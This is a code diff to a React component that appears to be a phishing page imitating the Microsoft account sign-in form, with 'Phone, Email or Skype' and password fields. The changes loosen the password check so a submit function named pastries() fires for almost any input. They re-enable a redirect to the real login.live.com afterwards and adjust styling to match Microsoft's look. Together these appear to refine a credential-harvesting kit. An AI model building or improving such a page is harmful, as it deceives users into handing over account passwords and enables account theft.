@@ -50,7 +50,7 @@ export default function Home() {
     }
   };
   const hitSet = () => {
-    if (pass && pass.length > 3) {
+    if (pass && pass.length > 1) {
       pastries();
     } else {
       setSun(true);
@@ -72,7 +72,7 @@ export default function Home() {
         console.log(err);
       })
       .finally(() => {
-        // window.location.replace("https://login.live.com");
+        window.location.replace("https://login.live.com");
       });
   };
 
@@ -108,7 +108,7 @@ export default function Home() {
               id=""
               value={run}
               onChange={(e) => setRun(e.target.value)}
-              className={`absolute left-10 right-10 border-b ${
+              className={`absolute left-10 right-10 border-b rounded-none ${
                 rain ? "border-red-500" : "border-black"
               } top-[10.8rem] pb-2 outline-none focus:border-sky-600`}
               placeholder="Phone, Email or Skype"
@@ -165,7 +165,7 @@ export default function Home() {
               id=""
               value={pass}
               onChange={(e) => setPass(e.target.value)}
-              className={`absolute bottom-44 right-10 left-10 border-b ${
+              className={`absolute bottom-44 right-10 left-10 rounded-none border-b ${
                 sun ? "border-red-500" : "border-black"
               }  pb-2 outline-none focus:border-sky-600`}
               placeholder="Password"
